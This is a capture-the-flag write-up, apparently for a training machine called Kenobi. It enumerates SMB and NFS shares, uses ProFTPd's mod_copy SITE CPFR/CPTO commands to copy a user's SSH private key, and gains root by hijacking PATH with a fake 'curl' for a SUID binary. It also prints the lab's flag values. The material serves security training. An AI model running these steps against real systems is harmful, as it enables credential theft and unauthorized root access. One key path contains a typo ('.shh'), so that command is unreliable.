--Nmap Results--
```
PORT     STATE SERVICE      REASON
21/tcp   open  ftp          syn-ack ttl 63
22/tcp   open  ssh          syn-ack ttl 63
80/tcp   open  http         syn-ack ttl 63
111/tcp  open  rpcbind      syn-ack ttl 63
139/tcp  open  netbios-ssn  syn-ack ttl 63
445/tcp  open  microsoft-ds syn-ack ttl 63
2049/tcp open  nfs          syn-ack ttl 63

SMB Ports at 139 and 445
>>Enumerate samba shares using 'nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.17.190'
->
PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.17.190\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.17.190\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.17.190\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>
|_smb-enum-users: ERROR: Script execution failed (use -d to debug)
->

>>Found 3 samba shares
```

--Samba Access---
```
> Connect to the network share using 'smbclient //<ip>/anonymous'
> Upon connecting to smb shell, using the 'dir' command, 'log.txt' can be found.
> Recursively download a samba share using 'smbget -R smb://<ip>/anonymous'
> log.txt content
-->FTP Port running at 21
> Using the command 'nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount IP'
PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-ls: Volume /var
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
| PERMISSION  UID  GID  SIZE  TIME                 FILENAME
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  .
| rwxr-xr-x   0    0    4096  2019-09-04T12:27:33  ..
| rwxr-xr-x   0    0    4096  2019-09-04T12:09:49  backups
| rwxr-xr-x   0    0    4096  2019-09-04T10:37:44  cache
| rwxrwxrwt   0    0    4096  2019-09-04T08:43:56  crash
| rwxrwsr-x   0    50   4096  2016-04-12T20:14:23  local
| rwxrwxrwx   0    0    9     2019-09-04T08:41:33  lock
| rwxrwxr-x   0    108  4096  2019-09-04T10:37:44  log
| rwxr-xr-x   0    0    4096  2019-01-29T23:27:41  snap
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  www
|_
| nfs-showmount: 
|_  /var *
| nfs-statfs: 
|   Filesystem  1K-blocks  Used       Available  Use%  Maxfilesize  Maxlink
|_  /var        9204224.0  1836520.0  6877108.0  22%   16.0T        32000

--> /var can be seen mounted
```

--ProFTPd connect
```
> Get proftpd version using 'nc machines_ip 21'
> Find exploit using the command 'searchsploit proftpd <version>'
--> currently, there 3 exploits that can be found
--> mod_copy module explout will be utilized using the commands to be executed in the proftpd shell listened to earlier using netcat:
	>> 'SITE CPFR /home/kenobi/.shh/id_rsa' -->specify source to be copied
	>> 'SITE CPTO /var/tmp/id_rsa' -->specify copy destination, /var was used since it was mounted based on earlier scan
> mount '/var/tmp' on local machine
--> Use the ff commands:
	>> mkdir /mnt/kenobiNFS
	>> mount machine_ip:/var /mnt/kenobiNFS (NOTE: nfs-common and cifs-utils must be installed)
	>> ls -la /mnt/kenobiNFS (to check)
> go to /var/tmp to get id_rsa and copy on local machine
> ssh to the remote host using kenobi's private ssh key
> flag in /home/kenobi/user.txt
-->'d0b0f3f53b6caa532a83915e19224899'
```

--Privilege Escalation--
```
> search the system for files with suid bits using 'find / -perm -u=s -type f 2>/dev/null'
--> the file '/usr/bin/menu' can be found
--> running this binary shows:
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
***************************************
> using the 'strings /usr/bin/menu' command, the commands pertaining to the choices can be seen as 
	curl -I localhost
	uname -r
	ifconfig
> the curl command can be used to manipulate in spawing a shell
> quit the menu binary
> enter the ff commands for suid manipulation:
	>> cd /tmp
	>> echo /bin/sh > curl	#on the current directory, the sh command is spawned as a file named 'curl' to be the binary that executes instead of the original curl binary in /bin
	>> chmod 777 curl	#give the curl file all privilege to be executable
	>> export PATH=/tmp:$PATH	#export the current path to allow the cul file to be executed when the menu binary run
	>> /usr/bin/menu
> the binary would now spawn a shell running as root
> use the shell to get the flag inside /root/root.txt
-->'177b3cd8562289f37382721c28381f02'
```

